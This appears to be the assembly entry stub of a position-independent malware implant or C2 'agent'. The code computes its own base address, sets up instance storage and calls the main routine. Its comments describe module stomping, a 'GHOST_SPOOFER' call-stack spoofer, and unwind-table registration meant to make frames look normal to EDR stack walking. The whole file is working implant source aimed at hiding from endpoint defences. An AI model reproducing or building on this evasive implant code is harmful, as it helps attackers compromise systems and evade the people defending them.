[BITS 64]
DEFAULT REL

GLOBAL _start
GLOBAL __Instance_offset
GLOBAL __Instance
GLOBAL _get_instance

EXTERN main_entry
EXTERN __pdata_start
EXTERN __pdata_end

section .text$A

_start:
    push    rsi
    push    rdi
    push    rbx
    push    rbp
    sub     rsp, 0x28

    call    _rip_tag
_rip_tag:
    pop     rbx
    sub     rbx, (_rip_tag - _start)

    lea     rax, [rel __Instance]
    lea     rcx, [rel __InstanceStorage]
    mov     [rax], rcx

    mov     rcx, rbx
    call    main_entry

    add     rsp, 0x28
    pop     rbp
    pop     rbx
    pop     rdi
    pop     rsi
    ret

section .text$B

_get_instance:
    lea     rax, [rel __Instance]
    mov     rax, [rax]
    ret

section .instdata

; Unwind-data locator (link VMAs, baked at link time; runtime = base + VMA).
; module_stomp relocates these alongside __Instance on transfer, and
; main_entry registers the table via RtlAddFunctionTable so stack walks
; (EDR stack walking, RtlCaptureStackBackTrace, exception dispatch) can
; traverse agent frames - the flat blob has no PE headers, so without
; these the exception directory never exists and every walk stops at
; the first agent frame.
__PdataStartPtr:    dq __pdata_start
__PdataEndPtr:      dq __pdata_end
__Instance_offset:  dd 0
__Instance:         dq 0
; 24KB: the INSTANCE (incl. GHOST_SPOOFER with per-slot chain regions and
; the probe buffers) outgrew the original 16KB - an overflowing instance
; silently trampled the .instdata after it (including the __pdata start/end
; pointers the unwind-table registration reads), producing deterministic
; ntdll!RtlVirtualUnwind2 crashes that looked like walker bugs (2026-11-09).
; Keep INSTANCE_STORAGE_SIZE in common.h in sync with this literal -
; the static_assert there fails the build if the struct outgrows it.
__InstanceStorage:  times 24576 db 0
